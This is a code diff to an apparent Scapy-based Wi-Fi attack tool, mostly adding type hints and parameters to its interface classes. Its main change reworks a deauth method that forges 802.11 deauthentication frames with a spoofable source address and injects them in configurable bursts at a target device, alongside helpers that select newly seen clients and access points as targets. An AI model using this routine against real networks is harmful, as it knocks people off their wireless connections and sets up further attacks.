@@ -10,7 +10,7 @@ from .core import Station, AP
 
 
 class Interface:
-    def __init__(self, name, essid=None, monitor_mode=False, channel=None):
+    def __init__(self, name: str, essid: str = None, monitor_mode: bool = False, channel=None):
         self.name = name
         self.monitor_mode = monitor_mode
         if monitor_mode:
@@ -81,22 +81,24 @@ class Interface:
 
 
 class MonitorInterface(Interface):
-    def __init__(self, name, channel=None):
+    def __init__(self, name: str, channel=None):
         super().__init__(name, monitor_mode=True, channel=channel)
 
-    def deauth(self, target_mac, bssid, count=1, channel=None):
+    def deauth(self, target_mac: str, source_mac: str, bssid: str = None, count=1, burst_count=200, channel=None, reason=7):
         self.channel_lock.acquire()
+        # Default to deauth from AP
+        bssid = bssid or source_mac
         if channel:
             self.set_channel(channel)
-        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
+        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=source_mac, addr3=bssid) / Dot11Deauth(reason=reason)
         for i in range(count):
             cprint("DEAUTH!!!", 'red')
-            for j in range(200):
+            for j in range(burst_count):
                 self.inject(pkt)
             sleep(1)
         self.channel_lock.release()
 
-    def get_new_client(self):
+    def get_new_client(self) -> Station:
         self.sta_sema.acquire()
         target = next((client for client in self.stations if client.new), None)
         target.new = False
@@ -144,7 +146,6 @@ class MonitorInterface(Interface):
                         else:
                             crypto = "OPN"
                     self.aps.append(AP(bssid, essid, crypto, channel, w))
-                    # print("Adding", bssid, essid, crypto, channel, self.targets[-1].w)
                     self.lock.release()
             elif (pkt.haslayer(Dot11)
                   and (pkt.type == 0 and pkt.addr3 == self.bssid
@@ -163,7 +164,7 @@ class MonitorInterface(Interface):
             print(pkt)
             raise e
 
-    def get_new_target(self):
+    def get_new_target(self) -> AP:
         self.ap_sema.acquire()
         target = next((ap for ap in self.aps if ap.new), None)
         target.new = False
